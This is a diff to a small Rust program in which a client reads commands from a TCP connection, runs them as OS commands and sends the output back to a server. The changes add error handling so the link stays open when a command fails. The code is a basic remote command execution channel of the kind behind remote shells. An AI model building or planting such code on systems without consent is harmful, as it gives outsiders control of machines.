@@ -100,18 +100,44 @@ fn client() {
                         let received = &buffer[0..size]; // slice the buffer to the actual received size.
 
                         match String::from_utf8(received.to_vec()) {
-                           Ok(command) => {
+                           
+                            Ok(command) => {
 
                                 println!(".> Recieved command: {}", command.trim());
 
                                 //process command here using OS commands
-                                let output = Command::new(command).stdout(Stdio::piped()).output().unwrap();
+                                //let output = Command::new(command).stdout(Stdio::piped()).output().unwrap();
+
+                                // This match ensures that even if there is an error on the client side , the connection will not close
+                                // this replaced the .unwrap() function. 
+                                match Command::new(command.clone()).stdout(Stdio::piped()).output() {
+                                    Ok(output) => {
+                                        if output.status.success() {
+                                            let stdout = String::from_utf8_lossy(&output.stdout);
+                                            //println!(".> Command output: \n{}", stdout);
+                                            stream.write(stdout.as_bytes()).unwrap();
+
+                                        } else {
+                                            let stderr = String::from_utf8_lossy(&output.stderr);
+                                            println!("!> Command failed: {}", stderr);
+                                        }
+                                    }
+                                    Err(e) => {
+
+                                        let error_msg = format!("\n!> {}\n", e);
+
+                                        stream.write_all(error_msg.as_bytes()).unwrap();
+                                    }
+
+                                }
 
                                 //let msg = b"DEBUG stream write DEBUG";
-                                let stdout = String::from_utf8(output.stdout).unwrap();
+                                //let stdout = String::from_utf8(output.stdout).unwrap();
 
-                                stream.write(stdout.as_bytes()).unwrap();
-                           } 
+                                // need to fix this part, commands will fail if too large, increase buffer? also need to improve output on the server side. 
+
+                                //stream.write(stdout.as_bytes()).unwrap();
+                            } 
                            Err(_) => {
                                 println!("!> Received non-UTF-8 data");
                             }
@@ -144,7 +170,7 @@ fn client() {
 
 fn handle_client(mut stream: TcpStream) {
 
-    println!(">> Connected to the client. Ready to send commands:");
+    println!(">> Connected to the client.");
 
     // Create buffer with 50 bytes
     let mut data = [0 as u8; 50];
@@ -190,7 +216,8 @@ fn handle_client(mut stream: TcpStream) {
 
                 // lossy converts between bytes and slice of bytes in u8
                 // also trims newline or whitespace. 
-                println!("*> Response from client: '{}'", String::from_utf8_lossy(&data[0..size]).trim()); 
+                
+                println!("\n{}\n", String::from_utf8_lossy(&data[0..size]).trim()); 
                 
             }
             Ok(_) => {
